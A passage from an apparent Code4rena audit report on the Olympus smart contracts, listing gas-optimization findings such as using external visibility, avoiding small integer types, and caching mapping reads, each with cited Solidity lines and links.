[https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)    [3]  ``PUBLIC`` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED ``EXTERNAL`` INSTEAD  Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents’ functions and change the visibility from ``external`` to ``public`` and can save gas by doing so.  *There are 5 instances of this issue:*  ``` File: 2022-08-olympus/src/Kernel.sol  439:  function grantRole(Role role_, address addr_) public onlyAdmin {  451:   function revokeRole(Role role_, address addr_) public onlyAdmin {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451)  ``` File: 2022-08-olympus/src/modules/TRSRY.sol  75:  function withdrawReserves( 76:        address to_, 77:        ERC20 token_, 78:        uint256 amount_ 79:    ) public {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  37:  function burnOhm(address from_, uint256 amount_) public permissioned {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37)  ``` File: 2022-08-olympus/src/modules/INSTR.sol  37: function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37)   [4] DON’T COMPARE BOOLEAN EXPRESSIONS TO BOOLEAN LITERALS   ``if (<x> == true)`` => ``if(<x>)`` , ``if (<x> == false)`` => ``if (!<x>)``  *There are 2 instances of this issue:*  ```  File: 2022-08-olympus/src/policies/Governance.sol  223:   if (proposalHasBeenActivated[proposalId_] == true) {  306:     if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   [5] USAGE OF ``UINTS/INTS`` SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size  [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed  *There are 92 instances of this issue*  ```  File: 2022-08-olympus/src/Kernel.sol  100:  function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}   #1  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  25: function VERSION() external pure override returns (uint8 major, uint8 minor) {      #2  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)   ```  File: 2022-08-olympus/src/modules/TRSRY.sol  51:  function VERSION() external pure override returns (uint8 major, uint8 minor) {     #3  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  ```  File: 2022-08-olympus/src/modules/RANGE.sol  45:  uint48 lastActive;           #4  85:  lastActive: uint48(block.timestamp),       #5  92:  lastActive: uint48(block.timestamp),       #6  136:  _range.high.lastActive = uint48(block.timestamp);        #7  148:  _range.low.lastActive = uint48(block.timestamp);        #8  191:  lastActive: uint48(block.timestamp),                    #9  200:   lastActive: uint48(block.timestamp),                   #10  115:  function VERSION() external pure override returns (uint8 major, uint8 minor) {      #11  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  ```  File: 2022-08-olympus/src/modules/PRICE.sol  44:   uint32 public nextObsIndex;              #12  47:   uint32 public numObservations;              #13  97:    numObservations = uint32(movingAverageDuration_ / observationFrequency_);        #14  127:   uint32 numObs = numObservations;                       #15  185:   uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;       #16  257:  numObservations = uint32(newObservations);                  #17  289:   numObservations = uint32(newObservations);                 #18  50:    uint48 public observationFrequency;                    #19  53:    uint48 public movingAverageDuration;                  #20  56:    uint48 public lastObservationTime;                    #21  75:     uint48 observationFrequency_,                         #22  76:      uint48 movingAverageDuration_                         #23  143:      lastObservationTime = uint48(block.timestamp);        #24  205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)      #25  215:       if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))     #26       240:      function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {     #27  266:      function changeObservationFrequency(uint48 observationFrequency_) external permissioned {       #28  59:        uint8 public constant decimals = 18;                     #29  84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();        #30  87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();         #31  113:       function VERSION() external pure override returns (uint8 major, uint8 minor) {        #32  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)   ```  File: 2022-08-olympus/src/modules/VOTES.sol  27: function VERSION() external pure override returns (uint8 major, uint8 minor) {       #33  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)    ```  File: 2022-08-olympus/src/modules/INSTR.sol  28:  function VERSION() public pure override returns (uint8 major, uint8 minor) {        #34  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)     ```  File: 2022-08-olympus/src/policies/Operator.sol   83:  uint8 public immutable ohmDecimals;                #35  86:  uint8 public immutable reserveDecimals;.             #36  375:  uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);           #37  377:   uint8(                                                                              #38 378:   36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals 379:   );  418:    uint8 oracleDecimals = PRICE.decimals();                     #39  430:     uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);          #40  432:      uint8(                                                                          #41 433:      36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals 434:      );  128:      lastRegen: uint48(block.timestamp),             #42  210:      uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&       #43           216:      uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&        #44  403:       vesting: uint48(0), // Instant swaps                            #45  404:        conclusion: uint48(block.timestamp + config_.cushionDuration),       #46  708:         _status.high.lastRegen = uint48(block.timestamp);                 #47  720:        _status.low.lastRegen = uint48(block.timestamp);                  #48  89:         uint32 public constant FACTOR_SCALE = 1e4;                           #49  97:          uint32[8] memory configParams                     #50  106:          if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          #51  108:           if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])     #52  116:             configParams[7] == uint32(0)                  #53  127:            count: uint32(0),                           #54  129:             nextObservation: uint32(0),                  #55  516:          function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {       #56  528:           uint32 duration_,                #57 529:        uint32 debtBuffer_,                   #58 530:        uint32 depositInterval_              #59  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();          #60 536:        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)       #61  548:       function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {       #62  560:        uint32 wait_,               #63 561:        uint32 threshold_,        #64 562:        uint32 observe_              #65  665:       uint32 observe = _config.regenObserve;          #66  705:        _status.high.count = uint32(0);                   #67  707:         _status.high.nextObservation = uint32(0);         #68  717:       _status.low.count = uint32(0);                    #69  719:       _status.low.nextObservation = uint32(0);              #70   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377-L379](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377-L379)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L430](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L430)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L432-L434](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L432-L434)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403-L404](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403-L404)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528-L530](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528-L530)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535-L536](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535-L536)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560-L562](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560-L562)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719)  ```  File: 2022-08-olympus/src/policies/PriceConfig.sol  45:  function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)               #71  58:   function changeMovingAverageDuration(uint48 movingAverageDuration_)                               #72  69:   function changeObservationFrequency(uint48 observationFrequency_)                                 #73  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69)   ```  File: 2022-08-olympus/src/policies/interfaces/IOperator.sol  13:  uint32 cushionFactor;       #74 14:  uint32 cushionDuration;      #75 15:  uint32 cushionDebtBuffer;    #76 16:  uint32 cushionDepositInterval;      #77 17:  uint32 reserveFactor;            #78 18:  uint32 regenWait;              #79 19:  uint32 regenThreshold;          #80 20:  uint32 regenObserve;            #81   31:  uint32 count;                    #82 32:  uint48 lastRegen;                 #83 33:  uint32 nextObservation;         #84    85:  function setCushionFactor(uint32 cushionFactor_) external;       #85   93:   uint32 duration_,                           #86 94:   uint32 debtBuffer_,                           #87 95:   uint32 depositInterval_                         #88  101:  function setReserveFactor(uint32 reserveFactor_) external;           #89  110:  uint32 wait_,                       #90 111:  uint32 threshold_,                  #91 112:  uint32 observe_                    #92  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13-L20](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13-L20)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31-L33](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31-L33)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93-L95](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93-L95)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110-L112](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110-L112)   [6]  USING ``STORAGE`` INSTEAD OF ``MEMORY`` FOR STRUCTS/ARRAYS SAVES GAS  When fetching data from a storage location, assigning the data to a ``memory`` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional ``MLOAD`` rather than a cheap stack read. Instead of declearing the variable with the ``memory`` keyword, declaring the variable with the ``storage`` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a ``memory`` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires ``memory``, or if the array/struct is being read from another ``memory`` array/struct  *There are 3 instances of this issue:*  ```  File: 2022-08-olympus/src/policies/Operator.sol  394: IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({  440:  Config memory config_ = _config;  446:   IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L394](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L394)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L440)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L446](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L446)  [7]  DIVISION BY TWO SHOULD USE BIT SHIFTING  ``<x> / 2`` is the same as ``<x> >>1``. The ``DIV`` opcode costs 5 gas, whereas ``SHR`` only costs 3 gas  *There are 2 instances of this issue:*  ```  File:  2022-08-olympus/src/policies/Operator.sol  372:   int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  427:   int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L372)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L427)  [8]    MULTIPLE ACCESSES OF A MAPPING/ARRAY SHOULD USE A LOCAL VARIABLE CACHE  The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping’s value in a local ``storage`` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations. Caching an array’s struct avoids recalculating the array offsets into memory  *There are 37 instances of this issue: *  ```  File: 2022-08-olympus/src/modules/TRSRY.sol  69:   withdrawApproval[withdrawer_][token_] = amount_;  143:   uint256 approval = withdrawApproval[withdrawer_][token_];  149:   withdrawApproval[withdrawer_][token_] = approval - amount_;   60: return token_.balanceOf(address(this)) + totalDebt[token_];  97:  totalDebt[token_] += amount_;  116:    totalDebt[token_] -= received;  131:    if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  132:    else totalDebt[token_] -= oldDebt - amount_;   106:    if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();  115:     reserveDebt[token_][msg.sender] -= received;  127:      uint256 oldDebt = reserveDebt[token_][debtor_];  129:      reserveDebt[token_][debtor_] = amount_;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L69)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L143)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L149](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L149)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131-L132](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131-L132)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L129)   ```  File: 2022-08-olympus/src/policies/BondCallback.sol  88:   approvedMarkets[teller_][id_] = true;  106:   if (!approvedMarkets[msg.sender][id_]) revert Callback_MarketNotSupported(id_);  143:   _amountsPerMarket[id_][0] += inputAmount_;  144:   _amountsPerMarket[id_][1] += outputAmount_;  179:    uint256[2] memory marketAmounts = _amountsPerMarket[id_];  114:    if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)  141:    priorBalances[quoteToken] = quoteToken.balanceOf(address(this)); 142:      priorBalances[payoutToken] = payoutToken.balanceOf(address(this));  160:    priorBalances[token] = token.balanceOf(address(this));  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L88](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L88)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L106](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L106)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143-L144)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L179)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L114](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L114)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L141-L142](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L141-L142)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L160](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L160)   ```  File: 2022-08-olympus/src/policies/Governance.sol   168:   getProposalMetadata[proposalId] = ProposalMetadata(  206:   ProposalMetadata memory proposal = getProposalMetadata[proposalId_];  198:     totalEndorsementsForProposal[proposalId_] += userVotes;  217:    (totalEndorsementsForProposal[proposalId_] * 100) <  193:    uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];  223:      if 